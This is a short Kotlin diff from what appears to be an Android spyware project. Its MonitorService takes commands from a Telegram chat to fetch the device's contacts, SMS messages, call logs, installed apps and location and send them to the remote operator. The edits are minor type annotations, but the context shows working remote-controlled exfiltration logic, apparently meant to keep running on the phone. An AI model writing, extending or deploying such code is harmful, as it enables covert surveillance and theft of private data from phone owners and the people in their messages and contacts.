@@ -41,6 +41,7 @@ import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.atomic.AtomicBoolean
 import kotlin.concurrent.thread
+import java.util.regex.Pattern
 
 const val PREFS_NAME = "monitor_config"
 const val KEY_PERSISTENT = "persistent_mode"
@@ -229,11 +230,11 @@ class MonitorService : Service() {
         } else if (trimmed == "/status") {
             sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
         } else if (trimmed == "/contacts") {
-            sendTelegramTask(chatId, "contacts", mapOf())
+            sendTelegramTask(chatId, "contacts", mapOf<String, Any>())
         } else if (trimmed == "/sms") {
-            sendTelegramTask(chatId, "sms", mapOf())
+            sendTelegramTask(chatId, "sms", mapOf<String, Any>())
         } else if (trimmed == "/calls") {
-            sendTelegramTask(chatId, "call_logs", mapOf())
+            sendTelegramTask(chatId, "call_logs", mapOf<String, Any>())
         } else if (trimmed == "/apps") {
             sendTelegramTask(chatId, "apps", mapOf("action" to "list"))
         } else if (trimmed == "/location") {
